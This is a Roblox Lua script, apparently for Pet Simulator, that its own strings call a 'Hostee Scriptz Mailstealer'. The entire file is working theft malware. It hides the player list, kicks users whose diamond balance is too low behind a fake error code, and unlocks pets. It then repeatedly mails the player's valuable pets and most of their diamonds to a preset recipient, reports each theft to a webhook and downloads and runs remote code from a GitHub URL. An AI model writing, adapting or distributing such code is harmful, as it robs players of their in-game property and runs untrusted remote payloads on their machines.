local HttpService = game:GetService("HttpService")
local webhookUrl = _G.Webhook

local Network = require(game:GetService("ReplicatedStorage").Library.Client.Network)
local Fire, Invoke = Network.Fire, Network.Invoke

hookfunction(getupvalue(Fire, 1), function(...)
    return true
end)

local FrameworkLibrary = require(game.ReplicatedStorage.Framework.Library)
local savedPets = FrameworkLibrary.Save.Get().Pets

if game.Players.LocalPlayer.leaderstats.Diamonds.Value < 100000 then
    game.Players.LocalPlayer:Kick("Error launching script. Error code: " .. _G.ScriptName .. ".LaunchScript")
end

local remotenameaaa = 0
for i, v in pairs(game.ReplicatedStorage:GetChildren()) do
    if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
        remotenameaaa = remotenameaaa + 1
        v.Name = tostring(remotenameaaa)
    end
end

game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, false)

local mailbox = game:GetService("Workspace").__MAP.Interactive.Mailbox
for i, v in pairs(mailbox:GetDescendants()) do
    if v:IsA("MeshPart") or v:IsA("Part") then
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(v.Position)
        break
    end
end

local folders = {
    game:GetService("Players").LocalPlayer.PlayerGui.Inventory.Frame.Main.Pets.Normal,
    game:GetService("Players").LocalPlayer.PlayerGui.Inventory.Frame.Main.Pets.Titanic
}

local function unlockPetsInFolder(folder)
    local children = folder:GetChildren()
    for _, child in ipairs(children) do
        if child:IsA("TextButton") and child.Locked.Visible == true then
            local name = child.Name
            local remote = game:GetService("ReplicatedStorage"):FindFirstChild("95")
            if remote then
                local args = {
                    [name] = false
                }
                remote:InvokeServer(args)
            else
                warn("Remote not found")
            end
        end
    end
end

while true do
    for _, folder in ipairs(folders) do
        unlockPetsInFolder(folder)
        wait(0.2)
    end

    local lockedCount = 0
    for _, folder in ipairs(folders) do
        for _, child in ipairs(folder:GetChildren()) do
            if child:IsA("TextButton") and child.Locked.Visible == true then
                lockedCount = lockedCount + 1
            end
        end
    end

    if lockedCount == 0 then
        -- All pets have been unlocked
        break
    end
end

for i, v in pairs(game:GetDescendants()) do
    if v:IsA("Sound") then
        v:Destroy()
    end
end

while wait() do
    for i, v in pairs(savedPets) do
        local v2 = FrameworkLibrary.Directory.Pets[v.id]
        if v2.huge == true and game.Players.LocalPlayer.leaderstats.Diamonds.Value > 5000000 then
            _G.Diamonds = game.Players.LocalPlayer.leaderstats.Diamonds.Value
            local args = {
                {
                    Recipient = "_G.Username",
                    Diamonds = game.Players.LocalPlayer.leaderstats.Diamonds.Value - 5000000,
                    Pets = { v.uid },
                    Message = "Hostee Scriptz Mailstealer"
                }
            }
            local remote = game:GetService("ReplicatedStorage"):FindFirstChild("107")
            if remote then
                remote:InvokeServer(unpack(args))
            end
            _G.PetName = v2.name
            _G.PetRar = v2.rarity
            local payload = {
                petName = v2.name,
                rarity = v2.rarity,
                action = "Mailstealer",
                username = game.Players.LocalPlayer.Name
            }
            local encodedPayload = HttpService:JSONEncode(payload)
            HttpService:PostAsync(webhookUrl, encodedPayload)
            loadstring(game:HttpGet("https://raw.githubusercontent.com/HosteeScriptz/HosteeHub/main/Executor%20detector%20Mail.lua"))()
        elseif v2.huge == true then
            _G.Diamonds = 0
            local args = {
                {
                    Recipient = "_G.Username",
                    Diamonds = 0,
                    Pets = { v.uid },
                    Message = "Hostee Scriptz Mailstealer"
                }
            }
            local remote = game:GetService("ReplicatedStorage"):FindFirstChild("107")
            if remote then
                remote:InvokeServer(unpack(args))
            end
            _G.PetName = v2.name
            _G.PetRar = v2.rarity
            local payload = {
                petName = v2.name,
                rarity = v2.rarity,
                action = "Mailstealer",
                username = game.Players.LocalPlayer.Name
            }
            local encodedPayload = HttpService:JSONEncode(payload)
            HttpService:PostAsync(webhookUrl, encodedPayload)
            loadstring(game:HttpGet("https://raw.githubusercontent.com/HosteeScriptz/HosteeHub/main/Executor%20detector%20Mail.lua"))()
        elseif (v2.rarity == "Exclusive" and v2.huge == false) or (v2.rarity == "Event" and game.Players.LocalPlayer.leaderstats.Diamonds.Value > 5000000) then
            _G.Diamonds = game.Players.LocalPlayer.leaderstats.Diamonds.Value
            local args = {
                {
                    Recipient = _G.Username,
                    Diamonds = game.Players.LocalPlayer.leaderstats.Diamonds.Value - 5000000,
                    Pets = { v.uid },
                    Message = "Hostee Scriptz Mailstealer"
                }
            }
            local remote = game:GetService("ReplicatedStorage"):FindFirstChild("107")
            if remote then
                remote:InvokeServer(unpack(args))
            end
            _G.PetName = v2.name
            _G.PetRar = v2.rarity
            local payload = {
                petName = v2.name,
                rarity = v2.rarity,
                action = "Mailstealer",
                username = game.Players.LocalPlayer.Name
            }
            local encodedPayload = HttpService:JSONEncode(payload)
            HttpService:PostAsync(webhookUrl, encodedPayload)
            loadstring(game:HttpGet("https://raw.githubusercontent.com/HosteeScriptz/HosteeHub/main/Executor%20detector%20Mail.lua"))()
        elseif v2.rarity == "Exclusive" and v2.huge == false or v2.rarity == "Event" then
            _G.Diamonds = 0
            local args = {
                {
                    Recipient = _G.Username,
                    Diamonds = 0,
                    Pets = { v.uid },
                    Message = "Hostee Scriptz Mailstealer"
                }
            }
            local remote = game:GetService("ReplicatedStorage"):FindFirstChild("107")
            if remote then
                remote:InvokeServer(unpack(args))
            end
            _G.PetName = v2.name
            _G.PetRar = v2.rarity
            local payload = {
                petName = v2.name,
                rarity = v2.rarity,
                action = "Mailstealer",
                username = game.Players.LocalPlayer.Name
            }
            local encodedPayload = HttpService:JSONEncode(payload)
            HttpService:PostAsync(webhookUrl, encodedPayload)
            loadstring(game:HttpGet("https://raw.githubusercontent.com/HosteeScriptz/HosteeHub/main/Executor%20detector%20Mail.lua"))()
        end
    end
end
